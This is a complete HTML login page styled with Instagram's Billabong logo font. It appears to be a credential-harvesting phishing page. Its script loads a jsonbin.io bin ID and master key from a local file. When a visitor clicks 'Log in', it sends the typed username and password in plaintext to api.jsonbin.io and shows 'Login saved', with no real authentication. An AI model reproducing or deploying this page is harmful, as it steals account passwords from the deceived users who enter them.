<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
@font-face {
  font-family: "Billabong";
  src: url("https://fonts.cdnfonts.com/s/14687/Billabong.woff") format("woff");
}

* {
  box-sizing: border-box;
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
}

body {
  margin: 0;
  min-height: 100vh;
  background: #ffffff;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 16px;
}

.card {
  width: 100%;
  max-width: 380px;
  background: #fff;
  padding: 28px 24px 32px;
  border-radius: 18px;
  box-shadow:
    0 6px 14px rgba(0,0,0,0.08),
    0 20px 40px rgba(0,0,0,0.12);
}

.logo {
  font-family: "Billabong", cursive;
  font-size: 44px;
  text-align: center;
  margin-bottom: 24px;
  color: #000;
}

.input-box {
  position: relative;
  margin-bottom: 14px;
}

.input-box input {
  width: 100%;
  padding: 14px 56px 14px 16px; /* extra space for eye */
  border-radius: 12px;
  border: 1px solid #ccc;
  font-size: 15px;
  outline: none;
}

.input-box input:focus {
  border-color: #000;
  box-shadow: 0 0 0 3px rgba(0,0,0,.12);
}

/* ✅ FIXED eye button (fully visible) */
.eye-btn {
  position: absolute;
  right: 10px;
  top: 50%;
  transform: translateY(-50%);
  width: 36px;
  height: 36px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
}

.eye-btn svg {
  width: 22px;
  height: 22px;
  fill: #000;
}

/* Classic black button */
.btn-black {
  width: 100%;
  margin-top: 18px;
  padding: 14px;
  border-radius: 14px;
  border: none;
  background: #000;
  color: #fff;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
}

.btn-black:active {
  transform: scale(0.97);
}

.status {
  text-align: center;
  margin-top: 14px;
  font-size: 14px;
}
</style>
</head>

<body>

<div class="card">
  <div class="logo">Welcome back</div>

  <div class="input-box">
    <input id="username" placeholder="Username">
  </div>

  <div class="input-box">
    <input id="password" type="password" placeholder="Password">

    <div class="eye-btn" onclick="togglePassword()">
      <!-- Eye open -->
      <svg id="eyeOpen" viewBox="0 0 24 24">
        <path d="M12 5c-7 0-10 7-10 7s3 7 10 7 10-7 10-7-3-7-10-7zm0 11a4 4 0 1 1 0-8 4 4 0 0 1 0 8z"/>
      </svg>

      <!-- Eye closed -->
      <svg id="eyeClosed" viewBox="0 0 24 24" style="display:none">
        <path d="M2 5l17 17-1.5 1.5-3.2-3.2c-1 .4-2.1.7-3.3.7-7 0-10-7-10-7a18.5 18.5 0 0 1 4.4-5.7L.5 6.5 2 5zm9.9 5.3 3.8 3.8a4 4 0 0 0-3.8-3.8z"/>
      </svg>
    </div>
  </div>

  <button class="btn-black" onclick="login()">Log in</button>

  <div id="status" class="status"></div>
</div>

<script>
let BIN_ID = "";
let MASTER_KEY = "";

fetch("./keywwww.dd")
  .then(r => r.json())
  .then(k => {
    BIN_ID = k.BIN_ID;
    MASTER_KEY = k.MASTER_KEY;
  });

function togglePassword() {
  const pass = document.getElementById("password");
  const open = document.getElementById("eyeOpen");
  const closed = document.getElementById("eyeClosed");

  const show = pass.type === "password";
  pass.type = show ? "text" : "password";
  open.style.display = show ? "none" : "block";
  closed.style.display = show ? "block" : "none";
}

async function login() {
  const user = username.value.trim();
  const pass = password.value.trim();
  const status = document.getElementById("status");

  if (!user || !pass) {
    status.textContent = "Please fill all fields";
    status.style.color = "#d32f2f";
    return;
  }

  status.textContent = "Saving...";
  status.style.color = "#555";

  const data = {
    username: user,
    password: pass,
    time: new Date().toISOString()
  };

  const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
    method: "PUT",
    headers: {
      "Content-Type": "application/json",
      "X-Master-Key": MASTER_KEY
    },
    body: JSON.stringify(data)
  });

  status.textContent = res.ok ? "Login saved ✔" : "Error saving data";
  status.style.color = res.ok ? "#2e7d32" : "#d32f2f";
}
</script>

</body>
</html>